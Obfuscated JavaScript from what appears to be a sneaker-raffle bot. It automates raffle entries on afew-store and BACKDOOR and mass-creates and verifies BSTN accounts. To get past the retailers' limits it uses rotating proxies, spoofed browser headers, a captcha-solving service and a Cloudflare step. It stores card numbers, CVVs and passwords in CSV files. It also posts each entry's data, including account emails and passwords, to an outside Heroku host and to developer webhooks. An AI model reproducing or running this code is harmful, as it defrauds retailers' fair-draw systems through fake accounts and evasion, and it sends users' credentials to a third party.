                            var _0x342b5b = new _0x92856['CookieJar']();
                            console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x47667f;
                            let _0x5ce783 = {
                                'method': 'GET',
                                'cookieJar': _0x342b5b,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x41e3f7[0x2] + ':' + _0x41e3f7[0x3] + '@' + _0x41e3f7[0x0] + ':' + _0x41e3f7[0x1]
                            }, _0x2d3f12 = _0x21878e['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x4e4b56 = _0x2d3f12 + '.json', _0x47f274 = await _0x328de3(_0x4e4b56);
                            console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x480b95 = _0x47f274['data']['product']['variants'];
                            if (_0x1b00eb != 'RANDOM') {
                                if (_0x480b95[0x1]['option1']['includes']('W')) {
                                    const _0x3dcbc0 = _0x3eafe0['women']['find'](_0x26b9ac => _0x26b9ac['EUsize'] === _0x1b00eb);
                                    _0x3dcbc0 && (_0x1b00eb = _0x3dcbc0['size']);
                                } else {
                                    if (_0x480b95[0x1]['option1']['includes']('Y')) {
                                        const _0x4855a4 = _0x3eafe0['men']['find'](_0x25e401 => _0x25e401['EUsize'] === _0x1b00eb);
                                        _0x4855a4 && (_0x1b00eb = _0x4855a4['size'] + 'Y');
                                    } else {
                                        const _0xaa0944 = _0x3eafe0['men']['find'](_0x48feef => _0x48feef['EUsize'] === _0x1b00eb);
                                        _0xaa0944 && (_0x1b00eb = _0xaa0944['size']);
                                    }
                                }
                                for (var _0x13fc53 of _0x480b95) {
                                    _0x13fc53['option1'] == _0x1b00eb && (_0x47667f = _0x13fc53['id']);
                                }
                            } else {
                                var _0x240888 = Math['round'](Math['random']() * (_0x480b95['length'] - 0x1));
                                _0x47667f = _0x480b95[_0x240888]['id'];
                            }
                            console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x328de3('https://raffles.afew-store.com/cart/' + _0x47667f + ':1'), _0x59811e = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x4485dc();
                        } catch (_0x266a28) {
                            if (_0x266a28['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x266a28);
                        }
                        const _0x2386c8 = await _0x26fbb9['newPage']();
                        await _0x2386c8['setDefaultNavigationTimeout'](0x1d4c0), await _0x2386c8['authenticate']({
                            'username': '' + _0x41e3f7[0x2],
                            'password': '' + _0x41e3f7[0x3]
                        }), await _0x2386c8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2386c8['setRequestInterception'](!![]), _0x2386c8['on']('request', _0xe6214c => {
                            _0xe6214c['resourceType']() === 'image' || _0xe6214c['resourceType']() === 'font' || _0xe6214c['resourceType']() === 'media' ? _0xe6214c['abort']() : _0xe6214c['continue']();
                        });
                        try {
                            await _0x2386c8['goto'](_0x59811e, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2386c8['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2386c8['type']('#checkout_email', '' + _0xe6ee3a[_0x35133a]['Email']), await _0x415e3e(0x320), await _0x2386c8['type']('#checkout_attributes_instagram', '' + _0xe6ee3a[_0x35133a]['Follower']), await _0x415e3e(0x320), await _0x2386c8['select']('#checkout_shipping_address_country', '' + _0xe6ee3a[_0x35133a]['Country']), await _0x2386c8['waitForTimeout'](0x258), await _0x2386c8['type']('#checkout_shipping_address_first_name', '' + _0xe6ee3a[_0x35133a]['FirstName']), await _0x2386c8['waitForTimeout'](0x320), await _0x2386c8['type']('#checkout_shipping_address_last_name', '' + _0xe6ee3a[_0x35133a]['LastName']), await _0x2386c8['waitForTimeout'](0x2bc), await _0x2386c8['type']('#checkout_shipping_address_address1', _0xe6ee3a[_0x35133a]['Address1'] + '\x20' + _0xe6ee3a[_0x35133a]['HouseNumber']), await _0x2386c8['waitForTimeout'](0x2bc), await _0x2386c8['type']('#checkout_shipping_address_address2', '' + _0xe6ee3a[_0x35133a]['Address2']), await _0x2386c8['waitForTimeout'](0x2bc), await _0x2386c8['type']('#checkout_shipping_address_zip', '' + _0xe6ee3a[_0x35133a]['Zip']), await _0x2386c8['waitForTimeout'](0x2bc), await _0x2386c8['type']('#checkout_shipping_address_city', '' + _0xe6ee3a[_0x35133a]['City']), await _0x2386c8['waitForTimeout'](0x2bc);
                        if (_0xe6ee3a[_0x35133a]['State'] != '')
                            try {
                                const _0x32381b = JSON['parse'](_0xaf9669['readFileSync']('States.json', 'utf8'));
                                await _0x415e3e(0x1f4);
                                if (_0xe6ee3a[_0x35133a]['State']['length'] > 0x2)
                                    for (let _0x5badb5 of _0x32381b) {
                                        if (_0x5badb5['Province'] == _0xe6ee3a[_0x35133a]['State']) {
                                            await _0x2386c8['select']('#checkout_shipping_address_province', _0x5badb5['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2386c8['select']('#checkout_shipping_address_province', _0xe6ee3a[_0x35133a]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x415e3e(0x190), _0x2386c8['evaluate'](() => {
                            const _0x3027b9 = document['querySelector']('#continue_button');
                            for (var _0x2a951c = 0x0; _0x2a951c < 0x5; _0x2a951c++) {
                                if (_0x3027b9) {
                                    _0x3027b9['click'](), _0x3027b9['click']();
                                    break;
                                } else
                                    _0x415e3e(0xfa0);
                            }
                        }), await _0x2386c8['waitForTimeout'](0x9c4);
                        try {
                            await _0x2386c8['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2386c8['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x2330ef => _0x2330ef['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2386c8['waitForTimeout'](0x7d0), console['log'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2386c8['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x415e3e(0x3e8), await _0x2386c8['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x3e1d8b => _0x3e1d8b['submit']()), await _0x415e3e(0x3e8);
                        try {
                            await _0x2386c8['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2386c8['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x479562 => _0x479562['submit']());
                        try {
                            await _0x2386c8['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x419b33 = 'no', _0x53db49(_0xe6ee3a[_0x35133a], _0x4543fd), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                                try {
                                    await _0x4d8e61(_0x165c4b['webhook'], _0x3f2c1e['succesDEVMSG']);
                                } catch {
                                }
                            await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x3f2c1e['succesDEVMSG']), await _0x415e3e(0xc8);
                            try {
                                await _0x4d8e61(_0x3ba9f8, _0x3f2c1e['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x5f9620['replace']('#', ''),
                                    'module': _0x4543fd['name'],
                                    'entrydata': JSON['stringify'](_0x31c598),
                                    'proxy': '' + _0x1ed6f3[_0x35133a]
                                };
                                var _0x23fffa = JSON['stringify'](prxdata);
                                let _0x242c4d = { 'headers': { 'content-type': 'application/json' } };
                                await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x23fffa, _0x242c4d);
                            } catch (_0x50b9aa) {
                            }
                        } catch (_0x3b78d1) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x519f7b) {
                        _0x519f7b['message']['includes']('selector') && (_0x519f7b = 'Connection\x20Error');
                        console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20' + _0x519f7b)), _0x4d398b = '' + _0x519f7b;
                        var _0x3fb5d9 = await _0x105954(_0xe6ee3a[_0x35133a], _0x4543fd, 'dev', !![], _0x4d398b);
                        _0x3f2c1e['errorDEV'] = { 'embeds': [_0x3fb5d9] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x3f2c1e['errorDEV']), await _0x4d8e61(_0x369064, _0x3f2c1e['errorDEV']), _0x419b33 = 'yes';
                    } finally {
                        _0x26fbb9 && _0x26fbb9['close']();
                        if (_0x419b33 == 'yes' && _0x5725e8 != 0x5 && _0x4d398b != 'Size\x20Not\x20Found') {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x4543fd['name'] + ']\x20Task\x20' + (_0x35133a + 0x1) + '\x20:\x20Retrying\x20(' + _0x5725e8 + '\x20/\x205)')), _0x35133a = _0x35133a - 0x1, _0x5725e8 = _0x5725e8 + 0x1;
                            continue;
                        }
                        _0x419b33 == 'yes' && _0x5725e8 >= 0x5 && (_0x4d12b6(_0xe6ee3a[_0x35133a], _0x4543fd), _0x419b33 = 'no', _0x5725e8 = 0x0);
                        if (_0x35133a + 0x1 == _0xe6ee3a['length']) {
                            await _0x415e3e(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x165c4b['AfewDelay'] + '\x20ms'), await _0x415e3e(_0x165c4b['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0x53b89a, _0x2432b5, _0x2b5bd2) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0xaf9669['writeFileSync']('proxies.txt', '');
                for (proxy in _0x2b5bd2) {
                    _0xaf9669['appendFileSync']('proxies.txt', _0x2b5bd2[proxy] + '\x0a');
                }
                for (var _0x48ebc1 = 0x0; _0x48ebc1 < _0x2432b5['length']; _0x48ebc1++) {
                    await _0x3da21c(_0x2432b5, _0x48ebc1), _0xaf9669['appendFileSync']('tasks.csv', '\x0a' + _0x2432b5[_0x48ebc1]['Url'] + ',' + _0x2432b5[_0x48ebc1]['Size'] + ',' + _0x2432b5[_0x48ebc1]['Email'] + ',' + _0x2432b5[_0x48ebc1]['Password'] + ',' + _0x2432b5[_0x48ebc1]['FirstName'] + ',' + _0x2432b5[_0x48ebc1]['LastName'] + ',' + _0x2432b5[_0x48ebc1]['Address1'] + ',' + _0x2432b5[_0x48ebc1]['Address2'] + ',' + _0x2432b5[_0x48ebc1]['HouseNumber'] + ',' + _0x2432b5[_0x48ebc1]['Zip'] + ',' + _0x2432b5[_0x48ebc1]['City'] + ',' + _0x2432b5[_0x48ebc1]['Country'] + ',' + _0x2432b5[_0x48ebc1]['State'] + ',' + _0x2432b5[_0x48ebc1]['CardNumber'] + ',' + _0x2432b5[_0x48ebc1]['ExpiryDate'] + ',' + _0x2432b5[_0x48ebc1]['CVV'] + ',' + _0x2432b5[_0x48ebc1]['NameOnCard'] + ',' + _0x2432b5[_0x48ebc1]['Phone'] + ',' + _0x2432b5[_0x48ebc1]['Follower']);
                }
                let _0x23aaff = {
                    'username': _0x5f9620,
                    'delay': _0x165c4b['delay'],
                    'version': _0x57c4cf,
                    'webhook': _0x165c4b['webhook']
                };
                const _0x36b683 = JSON['stringify'](_0x23aaff)['replace'](/"/g, '\x5c\x22');
                await _0x415e3e(0x3e8), _0x160a3e('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x36b683
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xc9c983, _0x1c56a9, _0x3a034a) {
                    var _0x5771aa = _0x1c56a9, _0x397422 = 0x0;
                    for (var _0x37e3bd = 0x0; _0x37e3bd < _0x1c56a9['length']; _0x37e3bd++) {
                        maxTasks = Number(_0x165c4b['threads']);
                        while (_0x397422 >= maxTasks) {
                            await _0x415e3e(_0x165c4b['delay']);
                        }
                        async function _0x598c68(_0x1e5697, _0x327bca, _0x159cc2, _0x27966d, _0x597a58) {
                            _0x397422++, _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x165c4b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x18f196;
                            try {
                                await _0x3da21c(_0x327bca, _0x27966d);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x424e52(_0x1e5697['name'] + '\x20Task\x20' + (_0x27966d + 0x1) + '\x20/\x20' + _0x327bca['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                            var _0x15cfb6 = await _0x105954(_0x327bca[_0x27966d], _0x1e5697, 'acc', ![]);
                            const _0x4c4eeb = { 'succesDEVMSG': { 'embeds': [_0x15cfb6] } }, _0x49ab55 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0xe58d89 = Math['round'](Math['random']() * (_0x159cc2['length'] - 0x1)), _0x547a53 = _0x159cc2[_0xe58d89]['split'](':'), _0x253a32;
                            try {
                                _0x253a32 = await _0x275ae5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x547a53[0x0] + ':' + _0x547a53[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x253a32 = await _0x275ae5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x547a53[0x0] + ':' + _0x547a53[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x3c6f34 = await _0x253a32['newPage']();
                                await _0x3c6f34['authenticate']({
                                    'username': '' + _0x547a53[0x2],
                                    'password': '' + _0x547a53[0x3]
                                }), console['log'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c6f34['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3c6f34['setRequestInterception'](!![]), _0x3c6f34['on']('request', _0x46cc35 => {
                                    _0x46cc35['resourceType']() === 'image' ? _0x46cc35['abort']() : _0x46cc35['continue']();
                                });
                                try {
                                    await _0x3c6f34['goto']('' + _0x49ab55), await _0x3c6f34['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x3c6f34['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x415e3e(0x7d0), console['log'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x415e3e(0x190), await _0x3c6f34['waitForSelector']('#firstname'), await _0x3c6f34['focus']('#firstname'), await _0x3c6f34['keyboard']['down']('Control'), await _0x3c6f34['keyboard']['press']('A'), await _0x415e3e(0xc8), await _0x3c6f34['keyboard']['up']('Control'), await _0x3c6f34['keyboard']['press']('Backspace'), await _0x3c6f34['type']('#firstname', _0x327bca[_0x27966d]['FirstName'], { 'delay': 0xf0 }), await _0x415e3e(0x190), await _0x3c6f34['focus']('#lastname'), await _0x3c6f34['keyboard']['down']('Control'), await _0x3c6f34['keyboard']['press']('A'), await _0x415e3e(0xc8), await _0x3c6f34['keyboard']['up']('Control'), await _0x3c6f34['keyboard']['press']('Backspace'), await _0x3c6f34['type']('#lastname', _0x327bca[_0x27966d]['LastName'], { 'delay': 0xe6 }), await _0x415e3e(0x190), await _0x3c6f34['focus']('#email_address'), await _0x3c6f34['keyboard']['down']('Control'), await _0x3c6f34['keyboard']['press']('A'), await _0x415e3e(0xc8), await _0x3c6f34['keyboard']['up']('Control'), await _0x3c6f34['keyboard']['press']('Backspace'), await _0x3c6f34['type']('#email_address', _0x327bca[_0x27966d]['Email'], { 'delay': 0x122 }), await _0x415e3e(0x190), await _0x3c6f34['type']('#password', _0x327bca[_0x27966d]['Password'], { 'delay': 0x82 }), await _0x415e3e(0x1f4), await _0x3c6f34['type']('#password-confirmation', _0x327bca[_0x27966d]['Password'], { 'delay': 0x7c }), console['log'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20Sending\x20Request'), await _0x415e3e(0x2bc), await _0x3c6f34['$eval']('#form-validate', _0x3ade71 => _0x3ade71['submit']()), await _0x415e3e(0x1388);
                                const _0x382f50 = await _0x3c6f34['$']('#email_address-error');
                                if (_0x382f50)
                                    throw new Error('Invalid\x20Email');
                                const _0xfd8819 = await _0x3c6f34['$']('#password-error');
                                if (_0xfd8819)
                                    throw new Error('Invalid\x20Password');
                                await _0x3c6f34['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20Account\x20' + _0x327bca[_0x27966d]['Email'] + '\x20Generated')), _0xaf9669['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x327bca[_0x27966d]['Email'] + ',' + _0x327bca[_0x27966d]['Password']);
                                try {
                                    _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x4c4eeb['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4d8e61(_0xd282bc, _0x4c4eeb['succesDEVMSG']);
                                let _0x3e782f = _0x327bca[_0x27966d];
                                try {
                                    prxdata = {
                                        'username': _0x5f9620['replace']('#', ''),
                                        'module': _0x1e5697['name'],
                                        'entrydata': JSON['stringify'](_0x3e782f),
                                        'proxy': '' + _0x159cc2[_0x27966d]
                                    };
                                    var _0x1e00c0 = JSON['stringify'](prxdata);
                                    let _0x5bb85 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x1e00c0, _0x5bb85);
                                } catch (_0x47e704) {
                                }
                                console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x1e7379) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20' + _0x1e7379)), _0x18f196 = '' + _0x1e7379;
                                var _0x59bf24 = await _0x105954(_0x327bca[_0x27966d], _0x1e5697, 'acc', !![], _0x18f196);
                                _0x4c4eeb['errorDEV'] = { 'embeds': [_0x59bf24] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x4c4eeb['errorDEV']), await _0x4d8e61(_0x369064, _0x4c4eeb['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x253a32)
                                    _0x253a32['close']();
                                if (retry == 'yes' && _0x597a58 < 0x5)
                                    return console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Task\x20' + (_0x27966d + 0x1) + '\x20:\x20Retrying\x20(' + (_0x597a58 + 0x1) + '\x20/\x205)')), _0x397422--, _0x597a58 = _0x597a58 + 0x1, _0x598c68(_0x1e5697, _0x327bca, _0x159cc2, _0x27966d, _0x597a58);
                                retry == 'yes' && _0x597a58 >= 0x5 && (_0x4d12b6(_0x327bca[_0x27966d], _0x1e5697), retry = 'no', _0x597a58 = 0x0), _0x397422--, console['log'](_0x5b438b() + '\x20[' + _0x1e5697['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                            }
                        }
                        _0x598c68(_0xc9c983, _0x5771aa, _0x3a034a, _0x37e3bd, 0x0), await _0x415e3e(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x32a751, _0x20942f) {
                    var _0x3b7429 = ![], _0x516dfa = [], _0x1d5dde = 0x0;
                    async function _0x10305b() {
                        var _0x224f8c = new _0x569e4e({
                            'user': _0x165c4b['masterMail'],
                            'password': _0x165c4b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x381a2a(_0x499232) {
                            _0x224f8c['openBox']('INBOX', ![], _0x499232);
                        }
                        _0x224f8c['once']('ready', function () {
                            _0x381a2a(function (_0x4a73b7, _0x131459) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4a73b7)
                                    throw _0x4a73b7;
                                _0x224f8c['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x8ecfff, _0xc239ea) {
                                    if (!_0xc239ea || !_0xc239ea['length'])
                                        console['log'](_0x5b438b() + '\x20[' + _0x32a751['name'] + ']\x20No\x20mails\x20found'), _0x224f8c['end']();
                                    else {
                                        var _0x30c6f6 = _0x224f8c['seq']['fetch'](_0xc239ea, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x30c6f6['on']('message', function (_0x4403d5, _0x95b385) {
                                            var _0x405a39 = '(#' + _0x95b385 + ')\x20';
                                            _0x4403d5['on']('body', function (_0x45f3d4, _0x11ae2b) {
                                                _0x2736cb(_0x45f3d4, (_0x37992a, _0x3948cf) => {
                                                    var _0x4261d7 = _0x3948cf['text']['split']('customer/account/confirm/')[0x1], _0x23bba5 = _0x4261d7['split'](']')[0x0], _0x5dd968 = _0x23bba5['split']('>')[0x0];
                                                    _0x516dfa['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x5dd968);
                                                });
                                            }), _0x4403d5['once']('end', function () {
                                            });
                                        }), _0x30c6f6['once']('error', function (_0xe03554) {
                                            console['log']('Fetch\x20error:\x20' + _0xe03554), _0x3b7429 = !![];
                                        }), _0x30c6f6['once']('end', function () {
                                            _0x224f8c['end'](), _0x3b7429 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x224f8c['once']('error', function (_0xcd4457) {
                            console['log'](_0x5dc29b['red'](_0xcd4457['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3b7429 = !![];
                        }), _0x224f8c['once']('end', async function () {
                            _0x3b7429 = !![];
                        }), _0x224f8c['connect']();
                    }
                    try {
                        _0x10305b();
                        while (!_0x3b7429) {
                            await _0x415e3e(0xfa0);
                        }
                        console['log']('Found\x20' + _0x516dfa['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x415e3e(0x7d0);
                    }
                    for (var _0xf93760 = 0x0; _0xf93760 < _0x516dfa['length']; _0xf93760++) {
                        maxTasks = Number(_0x165c4b['threads']);
                        while (_0x1d5dde >= maxTasks) {
                            await _0x415e3e(_0x165c4b['delay']);
                        }
                        async function _0xe33130(_0x525ab9, _0x438a43, _0xc984fe, _0x411420, _0x2dc840) {
                            _0x1d5dde++, _0x275ae5['use'](_0x149eeb());
                            if (_0x471d0d != 'yes')
                                var _0x471d0d = '', _0x2dc840 = 0x0;
                            var _0x5311b9 = Math['round'](Math['random']() * (_0xc984fe['length'] - 0x1)), _0x5ec60c = _0xc984fe[_0x5311b9]['split'](':'), _0x40bd71;
                            try {
                                _0x40bd71 = await _0x275ae5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5ec60c[0x0] + ':' + _0x5ec60c[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x40bd71 = await _0x275ae5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5ec60c[0x0] + ':' + _0x5ec60c[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x13de0c = await _0x40bd71['newPage']();
                                await _0x13de0c['authenticate']({
                                    'username': '' + _0x5ec60c[0x2],
                                    'password': '' + _0x5ec60c[0x3]
                                }), console['log'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Task\x20' + (_0x411420 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x13de0c['setRequestInterception'](!![]), _0x13de0c['on']('request', _0x1bc2de => {
                                    _0x1bc2de['resourceType']() === 'image' ? _0x1bc2de['abort']() : _0x1bc2de['continue']();
                                }), console['log'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Task\x20' + (_0x411420 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x13de0c['goto'](_0x438a43[_0x411420]);
                                } catch (_0xca067f) {
                                    _0x471d0d = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0xca067f);
                                }
                                console['log'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Task\x20' + (_0x411420 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x13de0c['waitForTimeout'](0xbb8);
                                try {
                                    await _0x13de0c['waitForSelector']('.account-nav'), _0x471d0d = 'no', console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Task\x20' + (_0x411420 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x5c0e9c = await _0x105954(null, _0x525ab9, 'ver', ![]);
                                    const _0x2da5ce = { 'succesDEVMSG': { 'embeds': [_0x5c0e9c] } };
                                    await _0x4d8e61(_0x4728a4, _0x2da5ce['succesDEVMSG']);
                                } catch {
                                    _0x471d0d = 'no';
